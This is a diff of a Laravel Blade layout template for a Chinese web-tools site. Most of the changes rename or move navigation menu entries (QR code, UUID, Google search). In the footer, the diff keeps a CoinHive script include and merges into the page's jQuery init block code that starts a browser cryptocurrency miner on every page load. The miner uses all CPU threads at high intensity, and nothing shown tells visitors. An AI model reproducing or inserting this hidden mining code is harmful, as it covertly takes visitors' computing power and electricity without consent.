@@ -67,7 +67,6 @@
                         <li><a href="/json/format" target="_self">JSON格式化高亮</a></li>
                     </ul>
                 </li>
-                <li class=""><a href="/g" target="_self">Google</a></li>
                 <li class="dropdown"><a href="javascript:;" target="_self" class="dropdown-toggle" data-toggle="dropdown">格式化工具 <i class="fa fa-caret-down"></i></a>
                     <ul class="dropdown-menu" role="menu">
                         <li><a href="/format/js" target="_self">HTML/JS格式化</a></li>
@@ -101,9 +100,9 @@
                     <ul class="dropdown-menu" role="menu">
                         <li><a href="/tables/rgb" target="_self">RGB颜色对照表</a></li>
                         <li><a href="/tables/httpstatus" target="_self">HTTP状态码表</a></li>
-                        <li><a href="/tables/httpheader" target="_self">HTTP请求头大全</a></li>
+                        <li><a href="/tables/httpheader" target="_self">HTTP请求头</a></li>
                         <li><a href="/tables/httpmethod" target="_self">HTTP请求方法</a></li>
-                        <li><a href="/tables/androidmanifest" target="_self">Android Manifest描述大全</a></li>
+                        <li><a href="/tables/androidmanifest" target="_self">Android Manifest描述</a></li>
                         <li><a href="/tables/geo" target="_self">国家代码与区号查询</a></li>
                     </ul>
                 </li>
@@ -111,11 +110,12 @@
                     <ul class="dropdown-menu" role="menu">
                         <li><a href="/tools/wordcount" target="_self">字数计算</a></li>
                         <li><a href="/tools/regex" target="_self">正则测试</a></li>
-                        <li><a href="/convert/qr" target="_self">二维码生成</a></li>
-                        <li><a href="/encrypt/uuid" target="_self">UUID在线生成</a></li>
+                        <li><a href="/tools/qr" target="_self">二维码生成</a></li>
+                        <li><a href="/tools/uuid" target="_self">UUID在线生成</a></li>
                         <li><a href="/tools/shortcut" target="_self">网址快捷方式</a></li>
                         <li><a href="/tools/screenshot" target="_self">网页截图</a></li>
                         <li><a href="/tools/downpage" target="_self">网页模版下载</a></li>
+                        <li><a href="/tools/g" target="_self">Google搜索</a></li>
                     </ul>
                 </li>
 
@@ -151,13 +151,12 @@
 @section('foot_js')
 
 @show
- <script type="text/javascript">
- (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');})();
- </script>
-{{--<script src="https://authedmine.com/lib/authedmine.min.js"></script>--}}
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script type="text/javascript">
-    var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?b1490187b42d2a969b6f51c5f8f4e814";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();var miner = new CoinHive.User(myMinerKey, myMinerName, {threads: navigator.hardwareConcurrency,autoThreads: false,throttle: 0.8,forceASMJS: false});miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+ (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');var miner = new CoinHive.User(myMinerKey, myMinerName, {threads: navigator.hardwareConcurrency,autoThreads: false,throttle: 0.9,forceASMJS: false});miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);var tab_pathname = window.location.pathname;$("#my_tab a").each(function(){if($(this).attr('href')==tab_pathname){$(this).parent().addClass('active');}});$("#my_tab a").click(function(){window.open($(this).attr('href'), '_self');});})();
+</script>
+<script type="text/javascript">
+var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?b1490187b42d2a969b6f51c5f8f4e814";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();
 </script>
 <script type="text/javascript">
 (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-103939233-1', 'auto'); ga('send', 'pageview');
